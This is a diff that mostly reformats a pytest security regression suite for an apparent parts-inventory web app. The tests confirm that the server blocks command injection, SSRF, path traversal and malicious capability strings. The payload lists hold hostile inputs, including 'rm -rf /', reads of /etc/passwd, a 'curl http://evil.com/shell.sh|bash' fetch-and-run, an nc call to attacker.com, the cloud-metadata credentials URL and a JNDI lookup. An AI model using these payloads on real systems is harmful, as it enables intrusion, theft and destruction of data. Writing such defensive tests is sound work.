@@ -127,22 +127,34 @@ def test_api_keys():
                 name="test_security",
                 description="Test role for security testing with limited permissions",
                 permissions=[
-                    "parts:read", "parts:create", "parts:update", "parts:write",
-                    "locations:read", "categories:read",
-                    "tasks:create", "tasks:read", "tasks:user",  # Needed to test task security validation
-                    "suppliers:use"  # Needed to test datasheet URL validation
+                    "parts:read",
+                    "parts:create",
+                    "parts:update",
+                    "parts:write",
+                    "locations:read",
+                    "categories:read",
+                    "tasks:create",
+                    "tasks:read",
+                    "tasks:user",  # Needed to test task security validation
+                    "suppliers:use",  # Needed to test datasheet URL validation
                 ],
-                is_custom=True
+                is_custom=True,
             )
             session.add(test_role)
             session.commit()
         else:
             # Update permissions in case they changed
             test_role.permissions = [
-                "parts:read", "parts:create", "parts:update", "parts:write",
-                "locations:read", "categories:read",
-                "tasks:create", "tasks:read", "tasks:user",
-                "suppliers:use"
+                "parts:read",
+                "parts:create",
+                "parts:update",
+                "parts:write",
+                "locations:read",
+                "categories:read",
+                "tasks:create",
+                "tasks:read",
+                "tasks:user",
+                "suppliers:use",
             ]
             session.commit()
 
@@ -153,7 +165,7 @@ def test_api_keys():
             email=f"{admin_username}@test.com",
             hashed_password="not_used_for_api_key_auth",
             is_active=True,
-            roles=[admin_role]
+            roles=[admin_role],
         )
         session.add(test_admin)
 
@@ -164,7 +176,7 @@ def test_api_keys():
             email=f"{regular_username}@test.com",
             hashed_password="not_used_for_api_key_auth",
             is_active=True,
-            roles=[test_role]  # Use test_security role with required permissions
+            roles=[test_role],  # Use test_security role with required permissions
         )
         session.add(test_user)
         session.commit()
@@ -181,7 +193,7 @@ def test_api_keys():
             role_names=["admin"],
             is_active=True,
             created_at=datetime.utcnow(),
-            usage_count=0
+            usage_count=0,
         )
         session.add(test_admin_key)
 
@@ -195,15 +207,21 @@ def test_api_keys():
             # Permissions are inherited from the user's role (test_security)
             # but we list them here for clarity
             permissions=[
-                "parts:read", "parts:create", "parts:update", "parts:write",
-                "locations:read", "categories:read",
-                "tasks:create", "tasks:read", "tasks:user",
-                "suppliers:use"
+                "parts:read",
+                "parts:create",
+                "parts:update",
+                "parts:write",
+                "locations:read",
+                "categories:read",
+                "tasks:create",
+                "tasks:read",
+                "tasks:user",
+                "suppliers:use",
             ],
             role_names=["test_security"],  # Match the user's role
             is_active=True,
             created_at=datetime.utcnow(),
-            usage_count=0
+            usage_count=0,
         )
         session.add(test_regular_key)
         session.commit()
@@ -250,282 +268,273 @@ def test_api_keys():
 def admin_headers(test_api_keys):
     """Admin user authentication headers"""
     admin_key, _ = test_api_keys
-    return {
-        "X-API-Key": admin_key,
-        "Content-Type": "application/json"
-    }
+    return {"X-API-Key": admin_key, "Content-Type": "application/json"}
 
 
 @pytest.fixture
 def regular_headers(test_api_keys):
     """Regular user authentication headers"""
     _, regular_key = test_api_keys
-    return {
-        "X-API-Key": regular_key,
-        "Content-Type": "application/json"
-    }
+    return {"X-API-Key": regular_key, "Content-Type": "application/json"}
 
 
 # ============================================================================
 # CVE-002: Command Injection in Backup Names
 # ============================================================================
 
+
 class TestCVE002_CommandInjection:
     """Test that CVE-002 (Command Injection in backup_name) is fixed"""
 
     @pytest.mark.critical
-    @pytest.mark.parametrize("malicious_payload", [
-        "; whoami",
-        "; rm -rf /",
-        "| cat /etc/passwd",
-        "$(whoami)",
-        "`id`",
-        "backup`whoami`.zip",
-        "backup$(id).tar",
-        "backup && cat /etc/passwd",
-        "backup\nwhoami",
-        "backup\r\nwhoami",
-        "backup|nc attacker.com 1234",
-        "backup;curl http://evil.com/shell.sh|bash"
-    ])
+    @pytest.mark.parametrize(
+        "malicious_payload",
+        [
+            "; whoami",
+            "; rm -rf /",
+            "| cat /etc/passwd",
+            "$(whoami)",
+            "`id`",
+            "backup`whoami`.zip",
+            "backup$(id).tar",
+            "backup && cat /etc/passwd",
+            "backup\nwhoami",
+            "backup\r\nwhoami",
+            "backup|nc attacker.com 1234",
+            "backup;curl http://evil.com/shell.sh|bash",
+        ],
+    )
     def test_command_injection_blocked(self, admin_headers, malicious_payload):
         """CRITICAL: Verify command injection payloads are blocked"""
         response = requests.post(
             f"{BASE_URL}/api/tasks/quick/database_backup",
             headers=admin_headers,
-            json={
-                "backup_name": malicious_payload,
-                "include_datasheets": False,
-                "include_images": False
-            },
-            verify=VERIFY_SSL
+            json={"backup_name": malicious_payload, "include_datasheets": False, "include_images": False},
+            verify=VERIFY_SSL,
         )
 
-        assert response.status_code == 400, \
-            f"Command injection should be blocked: '{malicious_payload}'. Got {response.status_code}: {response.text}"
+        assert (
+            response.status_code == 400
+        ), f"Command injection should be blocked: '{malicious_payload}'. Got {response.status_code}: {response.text}"
 
         # Verify error message indicates invalid characters (if present)
         # The 400 status code itself proves the validation is working
         if response.status_code == 400:
             response_json = response.json()
-            error_detail = response_json.get('detail', '')
+            error_detail = response_json.get("detail", "")
 
             # Only check error detail if it's not empty
             if error_detail:
                 error_detail_lower = error_detail.lower()
-                assert any(keyword in error_detail_lower for keyword in ['invalid', 'character', 'alphanumeric']), \
-                    f"Error message should indicate validation failure: {error_detail}"
+                assert any(
+                    keyword in error_detail_lower for keyword in ["invalid", "character", "alphanumeric"]
+                ), f"Error message should indicate validation failure: {error_detail}"
 
     def test_valid_backup_names_accepted(self, admin_headers):
         """Verify that valid backup names are still accepted"""
-        valid_names = [
-            "backup_20250122",
-            "daily-backup",
-            "MakerMatrix_backup_v1",
-            "test_backup_123"
-        ]
+        valid_names = ["backup_20250122", "daily-backup", "MakerMatrix_backup_v1", "test_backup_123"]
 
         for name in valid_names:
             response = requests.post(
                 f"{BASE_URL}/api/tasks/quick/database_backup",
                 headers=admin_headers,
-                json={
-                    "backup_name": name,
-                    "include_datasheets": False,
-                    "include_images": False
-                },
-                verify=VERIFY_SSL
+                json={"backup_name": name, "include_datasheets": False, "include_images": False},
+                verify=VERIFY_SSL,
             )
 
             # Should either succeed (200) or fail for auth reasons (403) or rate limit (500), not validation (400)
             # Note: 500 with rate limit messages is valid - proves CVE-009 rate limiting is working
             if response.status_code == 500:
-                assert "Too many concurrent" in response.text or "Concurrent task limit" in response.text, \
-                    f"500 error should be rate limiting, not other server error: {response.text}"
+                assert (
+                    "Too many concurrent" in response.text or "Concurrent task limit" in response.text
+                ), f"500 error should be rate limiting, not other server error: {response.text}"
             else:
-                assert response.status_code in [200, 201, 403], \
-                    f"Valid backup name should be accepted: '{name}'. Got {response.status_code}: {response.text}"
+                assert response.status_code in [
+                    200,
+                    201,
+                    403,
+                ], f"Valid backup name should be accepted: '{name}'. Got {response.status_code}: {response.text}"
 
 
 # ============================================================================
 # CVE-003: SSRF in Datasheet Downloads
 # ============================================================================
 
+
 class TestCVE003_SSRF:
     """Test that CVE-003 (SSRF in datasheet downloads) is fixed"""
 
     @pytest.mark.critical
-    @pytest.mark.parametrize("ssrf_url", [
-        # AWS metadata endpoint
-        "http://169.254.169.254/latest/meta-data/",
-        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
-        # Localhost variants
-        "http://localhost:8443/api/admin/secrets",
-        "http://127.0.0.1:8443/api/admin/users",
-        "http://[::1]:8443/admin",
-        "http://0.0.0.0:8443/admin",
-        # Internal network
-        "http://192.168.1.1/admin",
-        "http://10.0.0.1/internal",
-        "http://172.16.0.1/api",
-        # File protocol
-        "file:///etc/passwd",
-        "file:///var/secrets/keys.txt",
-        # Non-HTTPS
-        "http://digikey.com/datasheet.pdf",
-        "ftp://supplier.com/datasheet.pdf"
-    ])
+    @pytest.mark.parametrize(
+        "ssrf_url",
+        [
+            # AWS metadata endpoint
+            "http://169.254.169.254/latest/meta-data/",
+            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+            # Localhost variants
+            "http://localhost:8443/api/admin/secrets",
+            "http://127.0.0.1:8443/api/admin/users",
+            "http://[::1]:8443/admin",
+            "http://0.0.0.0:8443/admin",
+            # Internal network
+            "http://192.168.1.1/admin",
+            "http://10.0.0.1/internal",
+            "http://172.16.0.1/api",
+            # File protocol
+            "file:///etc/passwd",
+            "file:///var/secrets/keys.txt",
+            # Non-HTTPS
+            "http://digikey.com/datasheet.pdf",
+            "ftp://supplier.com/datasheet.pdf",
+        ],
+    )
     def test_ssrf_urls_blocked(self, regular_headers, ssrf_url):
         """CRITICAL: Verify SSRF-prone URLs are blocked"""
         response = requests.post(
             f"{BASE_URL}/api/tasks/quick/datasheet_download",
             headers=regular_headers,
-            json={
-                "part_id": "test_ssrf_protection",
-                "datasheet_url": ssrf_url,
-                "supplier": "digikey"
-            },
-            verify=VERIFY_SSL
+            json={"part_id": "test_ssrf_protection", "datasheet_url": ssrf_url, "supplier": "digikey"},
+            verify=VERIFY_SSL,
         )
 
-        assert response.status_code == 400, \
-            f"SSRF URL should be blocked: '{ssrf_url}'. Got {response.status_code}: {response.text}"
+        assert (
+            response.status_code == 400
+        ), f"SSRF URL should be blocked: '{ssrf_url}'. Got {response.status_code}: {response.text}"
 
     def test_valid_https_urls_accepted(self, regular_headers):
         """Verify that valid HTTPS URLs from trusted domains are accepted"""
-        valid_urls = [
-            "https://www.digikey.com/product-detail/en/test.pdf",
-            "https://www.mouser.com/datasheet/test.pdf"
-        ]
+        valid_urls = ["https://www.digikey.com/product-detail/en/test.pdf", "https://www.mouser.com/datasheet/test.pdf"]
 
         for url in valid_urls:
             response = requests.post(
                 f"{BASE_URL}/api/tasks/quick/datasheet_download",
                 headers=regular_headers,
-                json={
-                    "part_id": "test_valid_url",
-                    "datasheet_url": url,
-                    "supplier": "digikey"
-                },
-                verify=VERIFY_SSL
+                json={"part_id": "test_valid_url", "datasheet_url": url, "supplier": "digikey"},
+                verify=VERIFY_SSL,
             )
 
             # Should either succeed or fail for auth reasons or rate limit, not URL validation
             # Note: 500 with "Too many concurrent" message is valid - proves CVE-009 rate limiting is working
             if response.status_code == 500:
-                assert "Too many concurrent" in response.text or "Concurrent task limit" in response.text, \
-                    f"500 error should be rate limiting, not other server error: {response.text}"
+                assert (
+                    "Too many concurrent" in response.text or "Concurrent task limit" in response.text
+                ), f"500 error should be rate limiting, not other server error: {response.text}"
             else:
-                assert response.status_code in [200, 201, 403, 404], \
-                    f"Valid HTTPS URL should be accepted: '{url}'. Got {response.status_code}: {response.text}"
+                assert response.status_code in [
+                    200,
+                    201,
+                    403,
+                    404,
+                ], f"Valid HTTPS URL should be accepted: '{url}'. Got {response.status_code}: {response.text}"
 
 
 # ============================================================================
 # CVE-004 & CVE-006: Path Traversal
 # ============================================================================
 
+
 class TestCVE004_006_PathTraversal:
     """Test that CVE-004 (part_id) and CVE-006 (file_name) path traversal are fixed"""
 
     @pytest.mark.critical
-    @pytest.mark.parametrize("malicious_path", [
-        "../../../etc/passwd",
-        "..\\..\\..\\windows\\system32\\config\\sam",
-        "....//....//....//etc/passwd",
-        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
-        "../../sensitive_file",
-        "/etc/passwd",
-        "C:\\Windows\\System32\\config\\SAM",
-        "..\\..\\secrets\\api_keys.txt"
-    ])
+    @pytest.mark.parametrize(
+        "malicious_path",
+        [
+            "../../../etc/passwd",
+            "..\\..\\..\\windows\\system32\\config\\sam",
+            "....//....//....//etc/passwd",
+            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+            "../../sensitive_file",
+            "/etc/passwd",
+            "C:\\Windows\\System32\\config\\SAM",
+            "..\\..\\secrets\\api_keys.txt",
+        ],
+    )
     def test_path_traversal_in_part_id_blocked(self, regular_headers, malicious_path):
         """CRITICAL: Verify path traversal in part_id is blocked"""
         response = requests.post(
             f"{BASE_URL}/api/tasks/quick/part_enrichment",
             headers=regular_headers,
-            json={
-                "part_id": malicious_path,
-                "supplier": "digikey",
-                "capabilities": ["fetch_datasheet"]
-            },
-            verify=VERIFY_SSL
+            json={"part_id": malicious_path, "supplier": "digikey", "capabilities": ["fetch_datasheet"]},
+            verify=VERIFY_SSL,
         )
 
-        assert response.status_code == 400, \
-            f"Path traversal should be blocked in part_id: '{malicious_path}'. Got {response.status_code}"
+        assert (
+            response.status_code == 400
+        ), f"Path traversal should be blocked in part_id: '{malicious_path}'. Got {response.status_code}"
 
     @pytest.mark.critical
-    @pytest.mark.parametrize("malicious_filename", [
-        "../../../etc/passwd",
-        "../../sensitive.csv",
-        "..\\..\\config\\database.xlsx",
-        "/etc/shadow",
-        "C:\\secrets\\passwords.csv"
-    ])
+    @pytest.mark.parametrize(
+        "malicious_filename",
+        [
+            "../../../etc/passwd",
+            "../../sensitive.csv",
+            "..\\..\\config\\database.xlsx",
+            "/etc/shadow",
+            "C:\\secrets\\passwords.csv",
+        ],
+    )
     def test_path_traversal_in_file_import_blocked(self, regular_headers, malicious_filename):
         """CRITICAL: Verify path traversal in file_name is blocked"""
         response = requests.post(
             f"{BASE_URL}/api/tasks/quick/file_import_enrichment",
             headers=regular_headers,
-            json={
-                "file_name": malicious_filename,
-                "file_type": "csv",
-                "enrichment_enabled": True
-            },
-            verify=VERIFY_SSL
+            json={"file_name": malicious_filename, "file_type": "csv", "enrichment_enabled": True},
+            verify=VERIFY_SSL,
         )
 
-        assert response.status_code == 400, \
-            f"Path traversal should be blocked in file_name: '{malicious_filename}'. Got {response.status_code}"
+        assert (
+            response.status_code == 400
+        ), f"Path traversal should be blocked in file_name: '{malicious_filename}'. Got {response.status_code}"
 
     def test_valid_part_ids_accepted(self, regular_headers):
         """Verify valid part_ids are still accepted"""
-        valid_part_ids = [
-            "LM358N",
-            "PART-12345",
-            "ATmega328P",
-            "74HC595:DIP"
-        ]
+        valid_part_ids = ["LM358N", "PART-12345", "ATmega328P", "74HC595:DIP"]
 
         for part_id in valid_part_ids:
             response = requests.post(
                 f"{BASE_URL}/api/tasks/quick/part_enrichment",
                 headers=regular_headers,
-                json={
-                    "part_id": part_id,
-                    "supplier": "digikey",
-                    "capabilities": ["fetch_datasheet"]
-                },
-                verify=VERIFY_SSL
+                json={"part_id": part_id, "supplier": "digikey", "capabilities": ["fetch_datasheet"]},
+                verify=VERIFY_SSL,
             )
 
             # Note: 500 with "Too many concurrent" message is valid - proves CVE-009 rate limiting is working
             if response.status_code == 500:
-                assert "Too many concurrent" in response.text or "Concurrent task limit" in response.text, \
-                    f"500 error should be rate limiting, not other server error: {response.text}"
+                assert (
+                    "Too many concurrent" in response.text or "Concurrent task limit" in response.text
+                ), f"500 error should be rate limiting, not other server error: {response.text}"
             else:
-                assert response.status_code in [200, 201, 403, 404], \
-                    f"Valid part_id should be accepted: '{part_id}'. Got {response.status_code}"
+                assert response.status_code in [
+                    200,
+                    201,
+                    403,
+                    404,
+                ], f"Valid part_id should be accepted: '{part_id}'. Got {response.status_code}"
 
 
 # ============================================================================
 # CVE-007: Malicious Capabilities
 # ============================================================================
 
+
 class TestCVE007_MaliciousCapabilities:
     """Test that CVE-007 (malicious capability strings) is fixed"""
 
     @pytest.mark.critical
-    @pytest.mark.parametrize("malicious_capability", [
-        "__import__('os').system('id')",
-        "'; DROP TABLE parts; --",
-        "../../../etc/passwd",
-        "eval('malicious_code')",
-        "exec('import os; os.system(\"whoami\")')",
-        "${jndi:ldap://evil.com/exploit}",
-        "../../config",
-        "invalid_capability_123"
-    ])
+    @pytest.mark.parametrize(
+        "malicious_capability",
+        [
+            "__import__('os').system('id')",
+            "'; DROP TABLE parts; --",
+            "../../../etc/passwd",
+            "eval('malicious_code')",
+            "exec('import os; os.system(\"whoami\")')",
+            "${jndi:ldap://evil.com/exploit}",
+            "../../config",
+            "invalid_capability_123",
+        ],
+    )
     def test_malicious_capabilities_rejected(self, regular_headers, malicious_capability):
         """CRITICAL: Verify malicious capability strings are rejected"""
         response = requests.post(
@@ -534,13 +543,14 @@ class TestCVE007_MaliciousCapabilities:
             json={
                 "part_id": "test_capability_validation",
                 "supplier": "digikey",
-                "capabilities": [malicious_capability]
+                "capabilities": [malicious_capability],
             },
-            verify=VERIFY_SSL
+            verify=VERIFY_SSL,
         )
 
-        assert response.status_code == 400, \
-            f"Malicious capability should be rejected: '{malicious_capability}'. Got {response.status_code}"
+        assert (
+            response.status_code == 400
+        ), f"Malicious capability should be rejected: '{malicious_capability}'. Got {response.status_code}"
 
     def test_valid_capabilities_accepted(self, regular_headers):
         """Verify valid capabilities are still accepted"""
@@ -550,33 +560,35 @@ class TestCVE007_MaliciousCapabilities:
             ["fetch_pricing"],
             ["fetch_stock"],
             ["fetch_specifications"],
-            ["fetch_datasheet", "fetch_image"]
+            ["fetch_datasheet", "fetch_image"],
         ]
 
         for caps in valid_capabilities:
             response = requests.post(
                 f"{BASE_URL}/api/tasks/quick/part_enrichment",
                 headers=regular_headers,
-                json={
-                    "part_id": "test_valid_capabilities",
-                    "supplier": "digikey",
-                    "capabilities": caps
-                },
-                verify=VERIFY_SSL
+                json={"part_id": "test_valid_capabilities", "supplier": "digikey", "capabilities": caps},
+                verify=VERIFY_SSL,
             )
 
             # Note: 500 with "Too many concurrent" message is valid - proves CVE-009 rate limiting is working
             if response.status_code == 500:
-                assert "Too many concurrent" in response.text or "Concurrent task limit" in response.text, \
-                    f"500 error should be rate limiting, not other server error: {response.text}"
+                assert (
+                    "Too many concurrent" in response.text or "Concurrent task limit" in response.text
+                ), f"500 error should be rate limiting, not other server error: {response.text}"
             else:
-                assert response.status_code in [200, 201, 403, 404], \
-                    f"Valid capabilities should be accepted: {caps}. Got {response.status_code}"
+                assert response.status_code in [
+                    200,
+                    201,
+                    403,
+                    404,
+                ], f"Valid capabilities should be accepted: {caps}. Got {response.status_code}"
 
 
 # ============================================================================
 # CVE-001: Authorization Bypass
 # ============================================================================
+
 
 class TestCVE001_AuthorizationBypass:
     """Test that CVE-001 (authorization bypass for admin tasks) is fixed"""
@@ -595,7 +607,7 @@ class TestCVE001_AuthorizationBypass:
         api_key_hash = hashlib.sha256(api_key.encode()).hexdigest()
 
         # Connect to database
-        conn = sqlite3.connect('/home/ril3y/MakerMatrix/makermatrix.db')
+        conn = sqlite3.connect("/home/ril3y/MakerMatrix/makermatrix.db")
         cursor = conn.cursor()
 
         try:
@@ -608,32 +620,42 @@ class TestCVE001_AuthorizationBypass:
 
             # Create test user with hashed password
             from passlib.hash import pbkdf2_sha256
+
             hashed_password = pbkdf2_sha256.hash("test_password_123")
 
-            cursor.execute("""
+            cursor.execute(
+                """
                 INSERT INTO usermodel (id, username, email, hashed_password, is_active, password_change_required, created_at)
                 VALUES (?, ?, ?, ?, 1, 0, datetime('now'))
-            """, (user_id, username, f"{username}@test.local", hashed_password))
+            """,
+                (user_id, username, f"{username}@test.local", hashed_password),
+            )
 
             # Assign 'user' role
-            cursor.execute("""
+            cursor.execute(
+                """
                 INSERT INTO userrolelink (user_id, role_id)
                 VALUES (?, ?)
-            """, (user_id, role_id))
+            """,
+                (user_id, role_id),
+            )
 
             # Create API key for the user
-            cursor.execute("""
+            cursor.execute(
+                """
                 INSERT INTO api_keys (id, name, description, key_hash, key_prefix, user_id,
                                      permissions, role_names, is_active, created_at, usage_count)
                 VALUES (?, ?, ?, ?, ?, ?, '[]', '[]', 1, datetime('now'), 0)
-            """, (
-                str(uuid.uuid4()),
-                "Test API Key",
-                "Temporary API key for security testing",
-                api_key_hash,
-                api_key[:12],  # Store first 12 chars as prefix
-                user_id
-            ))
+            """,
+                (
+                    str(uuid.uuid4()),
+                    "Test API Key",
+                    "Temporary API key for security testing",
+                    api_key_hash,
+                    api_key[:12],  # Store first 12 chars as prefix
+                    user_id,
+                ),
+            )
 
             conn.commit()
 
@@ -642,10 +664,7 @@ class TestCVE001_AuthorizationBypass:
                 "user_id": user_id,
                 "username": username,
                 "api_key": api_key,
-                "headers": {
-                    "X-API-Key": api_key,
-                    "Content-Type": "application/json"
-                }
+                "headers": {"X-API-Key": api_key, "Content-Type": "application/json"},
             }
 
         finally:
@@ -662,28 +681,26 @@ class TestCVE001_AuthorizationBypass:
         response = requests.post(
             f"{BASE_URL}/api/tasks/quick/database_backup",
             headers=test_regular_user["headers"],
-            json={
-                "backup_name": "unauthorized_backup_test",
-                "include_datasheets": False,
-                "include_images": False
-            },
-            verify=VERIFY_SSL
+            json={"backup_name": "unauthorized_backup_test", "include_datasheets": False, "include_images": False},
+            verify=VERIFY_SSL,
         )
 
-        assert response.status_code == 403, \
-            f"Regular user should not create backup tasks (admin only). Got {response.status_code}: {response.text}"
+        assert (
+            response.status_code == 403
+        ), f"Regular user should not create backup tasks (admin only). Got {response.status_code}: {response.text}"
 
         # Verify error message indicates permission denied
         if response.status_code == 403:
             response_json = response.json()
-            error_detail = response_json.get('detail', '')
+            error_detail = response_json.get("detail", "")
 
             # The error detail might be directly in 'detail' or might be empty
             # If it's empty, the 403 status code itself proves the authorization works
             if error_detail:
                 error_detail_lower = error_detail.lower()
-                assert any(keyword in error_detail_lower for keyword in ['permission', 'admin', 'forbidden']), \
-                    f"Error should indicate permission denied: {error_detail}"
+                assert any(
+                    keyword in error_detail_lower for keyword in ["permission", "admin", "forbidden"]
+                ), f"Error should indicate permission denied: {error_detail}"
             # If error_detail is empty, the test still passes because we got 403
 
     def test_admin_can_create_backup(self, admin_headers):
@@ -691,27 +708,27 @@ class TestCVE001_AuthorizationBypass:
         response = requests.post(
             f"{BASE_URL}/api/tasks/quick/database_backup",
             headers=admin_headers,
-            json={
-                "backup_name": "admin_authorized_backup",
-                "include_datasheets": False,
-                "include_images": False
-            },
-            verify=VERIFY_SSL
+            json={"backup_name": "admin_authorized_backup", "include_datasheets": False, "include_images": False},
+            verify=VERIFY_SSL,
         )
 
         # Note: 500 with rate limit message is valid - proves CVE-009 rate limiting is working
         # Even admins are subject to rate limiting for backup tasks
         if response.status_code == 500:
-            assert "Too many concurrent" in response.text or "Concurrent task limit" in response.text, \
-                f"500 error should be rate limiting, not other server error: {response.text}"
+            assert (
+                "Too many concurrent" in response.text or "Concurrent task limit" in response.text
+            ), f"500 error should be rate limiting, not other server error: {response.text}"
         else:
-            assert response.status_code in [200, 201], \
-                f"Admin should be able to create backup tasks. Got {response.status_code}: {response.text}"
+            assert response.status_code in [
+                200,
+                201,
+            ], f"Admin should be able to create backup tasks. Got {response.status_code}: {response.text}"
 
 
 # ============================================================================
 # CVE-008: Parameter Injection
 # ============================================================================
+
 
 class TestCVE008_ParameterInjection:
     """Test that CVE-008 (parameter injection) is mitigated"""
@@ -728,26 +745,26 @@ class TestCVE008_ParameterInjection:
                 "__proto__": {"isAdmin": True},
                 "max_retries": 999,
                 "timeout_seconds": 99999,
-                "created_by_user_id": "attacker-user-id"
+                "created_by_user_id": "attacker-user-id",
             },
-            verify=VERIFY_SSL
+            verify=VERIFY_SSL,
         )
 
         if response.status_code in [200, 201]:
-            data = response.json().get('data', {})
+            data = response.json().get("data", {})
 
             # Verify injected parameters are not in task
-            assert data.get('max_retries', 0) != 999, \
-                "max_retries injection should be filtered"
-            assert data.get('timeout_seconds', 0) != 99999, \
-                "timeout_seconds injection should be filtered"
-            assert data.get('created_by_user_id') != "attacker-user-id", \
-                "created_by_user_id injection should be filtered"
+            assert data.get("max_retries", 0) != 999, "max_retries injection should be filtered"
+            assert data.get("timeout_seconds", 0) != 99999, "timeout_seconds injection should be filtered"
+            assert (
+                data.get("created_by_user_id") != "attacker-user-id"
+            ), "created_by_user_id injection should be filtered"
 
 
 # ============================================================================
 # CVE-009: Rate Limiting
 # ============================================================================
+
 
 class TestCVE009_RateLimiting:
     """Test that CVE-009 (rate limiting not enforced) is fixed"""
@@ -763,12 +780,8 @@ class TestCVE009_RateLimiting:
             response = requests.post(
                 f"{BASE_URL}/api/tasks/quick/part_enrichment",
                 headers=regular_headers,
-                json={
-                    "part_id": f"rate_limit_test_{i}",
-                    "supplier": "digikey",
-                    "capabilities": ["fetch_datasheet"]
-                },
-                verify=VERIFY_SSL
+                json={"part_id": f"rate_limit_test_{i}", "supplier": "digikey", "capabilities": ["fetch_datasheet"]},
+                verify=VERIFY_SSL,
             )
 
             if response.status_code == 429:  # Too Many Requests
@@ -781,13 +794,15 @@ class TestCVE009_RateLimiting:
 
         # This test will initially fail until rate limiting is properly enforced
         # Comment out assertion below if rate limiting implementation is still in progress
-        assert rate_limit_hit or successful_requests <= 12, \
-            f"Rate limiting should be enforced. Created {successful_requests} tasks without hitting limit."
+        assert (
+            rate_limit_hit or successful_requests <= 12
+        ), f"Rate limiting should be enforced. Created {successful_requests} tasks without hitting limit."
 
 
 # ============================================================================
 # Authentication Tests (Basic Security)
 # ============================================================================
+
 
 class TestAuthentication:
     """Basic authentication security tests"""
@@ -798,13 +813,12 @@ class TestAuthentication:
             pytest.skip("Security tests require running dev server: python scripts/dev_manager.py")
 
         # Use a protected endpoint (tasks require authentication)
-        response = requests.get(
-            f"{BASE_URL}/api/tasks",
-            verify=VERIFY_SSL
-        )
+        response = requests.get(f"{BASE_URL}/api/tasks", verify=VERIFY_SSL)
 
-        assert response.status_code in [401, 403], \
-            f"Unauthenticated requests should be denied, got {response.status_code}: {response.text[:100]}"
+        assert response.status_code in [
+            401,
+            403,
+        ], f"Unauthenticated requests should be denied, got {response.status_code}: {response.text[:100]}"
 
     def test_invalid_api_key_rejected(self):
         """Verify invalid API keys are rejected"""
@@ -812,14 +826,12 @@ class TestAuthentication:
             pytest.skip("Security tests require running dev server: python scripts/dev_manager.py")
 
         # Use a protected endpoint with invalid API key
-        response = requests.get(
-            f"{BASE_URL}/api/tasks",
-            headers={"X-API-Key": "invalid_key_12345"},
-            verify=VERIFY_SSL
-        )
+        response = requests.get(f"{BASE_URL}/api/tasks", headers={"X-API-Key": "invalid_key_12345"}, verify=VERIFY_SSL)
 
-        assert response.status_code in [401, 403], \
-            f"Invalid API key should be rejected, got {response.status_code}: {response.text[:100]}"
+        assert response.status_code in [
+            401,
+            403,
+        ], f"Invalid API key should be rejected, got {response.status_code}: {response.text[:100]}"
 
 
 # ============================================================================
